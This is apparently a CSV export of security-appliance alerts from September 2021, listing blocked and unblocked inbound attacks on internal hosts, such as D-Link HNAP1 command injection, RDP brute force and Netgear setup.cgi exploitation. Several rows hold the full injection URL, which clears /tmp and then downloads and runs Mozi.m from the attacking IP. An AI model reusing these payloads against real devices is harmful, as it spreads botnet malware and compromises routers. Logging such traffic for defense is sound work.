Severity,Rule Message,Subcategory,Event Count,Source IP,Source Port,Destination IP,Destination Port,Protocol,Last Time,URL,Event Subtype
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,47.89.192.12,http,10.63.58.173,45772,tcp,09-04-2021 07:47:36,http://49.40.26.149/,alert
25,CS_InBound_NTP_Attack Event Detected,D-Link Router Command Injection attack blocked,1,103.217.123.42,26393,10.63.58.173,http:80,tcp,09-04-2021 07:43:53,http://49.40.26.149:80/HNAP1/,alert
25,CS_InBound_NTP_Attack Event Detected,D-Link Router Command Injection attack blocked,1,116.120.108.26,4439,10.135.130.72,0,tcp,09-04-2021 07:10:17,http://49.40.8.35:80/HNAP1/,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,56235,10.144.34.109,0,tcp,09-04-2021 06:39:04,,alert
25,CS_InBound_NTP_Attack Event Detected,Remote OS Command Injection attack blocked,1,62.16.51.110,51173,10.135.132.152,0,tcp,09-04-2021 04:29:03,http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://62.16.51.110:55831/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,alert
25,CS_InBound_NTP_Attack Event Detected,Netgear Router Authentication Bypass attack blocked,1,62.16.51.110,51173,10.135.132.152,0,tcp,09-04-2021 04:29:03,http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://62.16.51.110:55831/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,alert
25,CS_InBound_NTP_Attack Event Detected,Remote OS Command Injection attack blocked,1,115.97.137.81,33580,10.141.154.25,8080,tcp,09-04-2021 04:01:12,http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.97.137.81:36962/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,alert
25,CS_InBound_NTP_Attack Event Detected,Netgear Router Authentication Bypass attack blocked,1,115.97.137.81,33580,10.141.154.25,8080,tcp,09-04-2021 04:01:12,http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.97.137.81:36962/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,alert
25,CS_InBound_NTP_Attack Event Detected,Netgear Router Authentication Bypass attack blocked,1,178.141.71.253,35641,10.144.34.109,0,tcp,09-04-2021 03:21:31,http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.141.71.253:43646/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,alert
25,CS_InBound_NTP_Attack Event Detected,Remote OS Command Injection attack blocked,1,178.141.71.253,35641,10.144.34.109,0,tcp,09-04-2021 03:21:30,http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.141.71.253:43646/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,alert
